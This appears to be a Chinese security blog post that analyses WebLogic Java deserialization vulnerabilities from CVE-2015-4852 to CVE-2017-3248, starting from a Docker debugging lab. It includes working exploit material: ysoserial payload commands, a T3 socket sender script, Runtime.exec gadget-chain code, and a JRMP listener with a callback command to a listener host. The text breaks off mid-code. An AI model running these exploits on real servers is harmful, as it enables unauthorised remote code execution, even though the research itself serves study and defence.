<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebLogic环境搭建复杂，一般使用docker，可参考此<a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html">博客</a></p>
<h3 id="weblogic-10-3-6-0"><a href="#weblogic-10-3-6-0" class="headerlink" title="weblogic: 10.3.6.0"></a>weblogic: 10.3.6.0</h3><blockquote>
<p>参考<a href="vulhub/weblogic%E7%89%88%E6%9C%AC">vulhub&#x2F;weblogic版本</a></p>
</blockquote>
<ol>
<li><p>创建docker-compose.yml</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">weblogic:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">vulhub/weblogic</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">            <span class="attr">debugFlag:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>运行<code>docker-compose up -d</code></p>
</li>
<li><p>把weblogic的源码和jdk包拷出来</p>
<blockquote>
<p>要是源码太多了，就只复制wlserver出来就好</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp [weblogic id]:/root ./root</span><br></pre></td></tr></table></figure>
</li>
<li><p>IDEA打开<code>/root/Oracle/Middleware/wlserver_10.3/</code>目录</p>
</li>
<li><p>把Middleware目录下所有的*.jar包都放在一个test的文件夹里（同名.jar会有影响，比如CVE-2020-14645）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir test &amp;&amp; find ./ -name &#x27;*.jar&#x27; -exec cp &#123;&#125; ./test/ \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在<code>Project Settings-&gt;Libraries</code>下添加test目录</p>
</li>
<li><p>前往<code>Project Settings-&gt;Project</code>，选用WebLogic自带的jdk1.6</p>
</li>
<li><p>创建remote server，配置远程调试的IP（localhost）和端口（8453），点击debug，出现以下信息即为成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Connected to the target VM, address: &#x27;localhost:8453&#x27;, transport: &#x27;socket&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>（附）抓取流量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br><span class="line">apt-get clean</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install tcpdump</span><br><span class="line">tcpdump -w /tmp/tcp.cap</span><br><span class="line">docker cp [weblogic id]:/tmp/tcp.cap ./</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="weblogic-12-2-1-4"><a href="#weblogic-12-2-1-4" class="headerlink" title="weblogic: 12.2.1.4"></a>weblogic: 12.2.1.4</h3><blockquote>
<p>参考<a href="https://hub.docker.com/_/oracle-weblogic-server-12c">官网</a>，后面的CVE-2020-13645会用到</p>
</blockquote>
<ol>
<li><p>在当前路路径创建<code>domain.properties</code>文件</p>
<blockquote>
<p>注意密码需要至少8个字符，且至少有1个数字或特殊符号，否则会报错</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">username=myadminusername</span><br><span class="line">password=myadminpassword!</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建<code>docker-compose.yml</code>文件</p>
<blockquote>
<p>默认是生产模式，所以这里把PRODUCTION_MODE设为””，否则无法调试</p>
<p>DOMAIN_NAME默认为空，这里设置为”base_domain”，否则会报找不到文件错误</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">weblogic:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">store/oracle/weblogic:12.2.1.4-dev-200117</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">            <span class="attr">DOMAIN_NAME:</span> <span class="string">&quot;base_domain&quot;</span></span><br><span class="line">            <span class="attr">debugFlag:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">            <span class="attr">PRODUCTION_MODE:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="attr">ADMINISTRATION_PORT_ENABLED:</span> <span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">            <span class="attr">source:</span> <span class="string">./</span></span><br><span class="line">            <span class="attr">target:</span> <span class="string">/u01/oracle/properties</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;9002:9002&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
</li>
<li><p>拷贝源码和jdk</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp [weblogic id]:/u01 ./u01</span><br></pre></td></tr></table></figure>
</li>
<li><p>后面步骤和上面一样</p>
</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><h4 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
</blockquote>
<p><strong>payload</strong></p>
<p>生成反序列化payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-<span class="built_in">all</span>.jar CommonsCollections1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>祖传T3脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_send</span>(<span class="params">ip, port, file</span>):</span><br><span class="line">    t3_header = <span class="string">&#x27;t3 10.3.6\nAS:255\nHL:19\n\n&#x27;</span></span><br><span class="line">    host = (ip, <span class="built_in">int</span>(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">&#x27;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000&#x27;</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">&#x27;%s%s&#x27;</span> % (<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t3_send(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;7001&#x27;</span>,<span class="string">&#x27;poc.ser&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>漏洞利用的原理利用<code>TransformedMap.setValue()</code>或者<code>LazyMap.get()</code>（ysoserial用的就是这个方法）方法来触发<code>Apache Commons Collections</code>，而在我们的<code>AnnotationInvocationHandler</code>类中，都含有这两个方法的调用，下面我们来看一下它们的入口点</p>
<p>以<code>TransformedMap</code>为例，在<code>AnnotationInvocationHandler</code>类中，我们可以发现<code>memberValues</code>的类型为<code>Map&lt;String, Object&gt;</code>，我们可以控制其类型为<code>TransformedMap</code>，然后<code>readObject()</code>方法的方法中，我们可以看到<code>entrySet</code>调用了<code>setValue()</code>方法，满足利用条件</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435a1f8cd7abec091ddbb24.png" alt="image-20210124182703110"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435b5a259cd2d0a4f07dfb2.png" alt="image-20210124182534426"></p>
<blockquote>
<p>这里有一处小细节就是，为了让var7非空，我们需要执行<code>innerMap.put(&quot;value&quot;, &quot;value&quot;);</code>，原因是我们的var3的值为[“value”] &#x3D;&gt; “class java.lang.annotaion.RetentionPolicy”，即只有一个”value”的key值，具体可自行去参考它的实现</p>
</blockquote>
<p>这里给出代码实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollection1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;); </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class, Class[].class</span><br><span class="line">                    &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Object.class, Object[].class</span><br><span class="line">                    &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class</span><br><span class="line">                    &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;calc&quot;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//只需要有一处调用 chainedTransformer </span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">inMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        inMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outMap</span> <span class="operator">=</span> TransformedMap.decorate(inMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cls.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Class.class, Map.class</span><br><span class="line">        &#125;);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            Retention.class, outMap</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 写出到文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 模拟触发代码执行 </span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">newObj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以<code>LazyMap</code>为例，触发点在调用<code>memerValues.entrySet()</code>时会触发它的<code>invoke()</code>方法，其中存在<code>get()</code>方法满足利用条件</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714358835f39a30b4f5a8bb38.png" alt="image-20210124192432215"></p>
<p>代码的实现参考ysoserial的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PayloadTest(precondition = &quot;isApplicableJavaVersion&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123;</span></span><br><span class="line"><span class="meta">    &quot;commons-collections:commons-collections:3.1&quot;</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123;</span></span><br><span class="line"><span class="meta">    &quot;frohoff&quot;</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span></span><br><span class="line">	<span class="keyword">extends</span> <span class="title class_">PayloadRunner</span></span><br><span class="line">	<span class="keyword">implements</span> <span class="title class_">ObjectPayload</span> &lt; InvocationHandler &gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(String command)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] execArgs = &#123;</span><br><span class="line">            command</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Integer.valueOf(<span class="number">1</span>))</span><br><span class="line">        &#125;);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class, Class[].class</span><br><span class="line">            &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Object.class, Object[].class</span><br><span class="line">            &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class</span><br><span class="line">            &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Integer.valueOf(<span class="number">1</span>))</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Gadgets.createMemoitizedProxy(lazyMap, Map.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        <span class="keyword">return</span> handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isApplicableJavaVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>增加<code>ClassFilter.isBlackListed()</code>函数并把涉及到的3个类加入到黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</span><br><span class="line">weblogic.rjvm.MsgAbbrevInputStream.class</span><br><span class="line">weblogic.iiop.Utils.class</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><p><strong>工具利用</strong></p>
<p><a href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
<p>IDEA创建application配置，在Program arguments填入，或者导出.jar</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-H &quot;127.0.0.1&quot; -C &quot;touch /tmp/success&quot; -B -os linux</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2015-4852的黑名单进行绕过，对整个利用链再加一层封装即可绕过黑名单，新的利用点在<code>weblogic.jms.common.StreamMessageImpl</code>类中的<code>readExternal()</code>方法把传入的序列化数据，调用到上面CVE-2015-4852提到的<code>readObject()</code>的方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714353df5a7a5d2ddf1caaef7.png" alt="image-20210125161308443"></p>
<p>所以exploit的写法就是把<code>CommonsCollections1</code>的实现再套一层<code>StreamMessageImpl</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021356fb595eb0794698ec7722.png" alt="image-20210127205403637"></p>
<p><strong>补丁</strong></p>
<p>把涉及类加入到黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weblogic.jms.common.StreamMessageImpl</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
<p>修改TYPE如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TYPE</span> <span class="operator">=</span> <span class="string">&quot;marshall&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714356a85e15315bcd21561f5.png" alt="image-20210125163013383"></p>
<p><strong>漏洞分析</strong></p>
<p>这个CVE也是对CVE-2015-4852的黑名单进行绕过，利用到的类是<code>weblogic.corba.utils.MarshalledObject</code>类，在反序列化这个类的时候会调用<code>readResolve()</code>方法，里面也调用了ObjectInputStream的<code>readObject()</code>方法</p>
<p><code>MarshalledObject</code>在构造时把参数<code>var1</code>传到<code>this.objBytes</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436987d24cd4e9b48d1de9b.png" alt="image-20210125163953194"></p>
<p>在调用<code>readResolve()</code>方法时会触发<code>readObject()</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436a8b136590b4722202792.png" alt="image-20210125164049349"></p>
<p>同理exploit的写法是把<code>CommonsCollections1</code>的实现再套一层<code>MarshalledObject</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020213564684f54ab2b300cdfcdd.png" alt="image-20210127205454949"></p>
<p><strong>补丁</strong></p>
<p>把涉及类加入到黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weblogic.corba.utils.MarshalledObject</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.exploit-db.com/exploits/44553">攻击脚本</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JRMPClient</span></span><br><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness = &quot;ysoserial.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Registry&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title 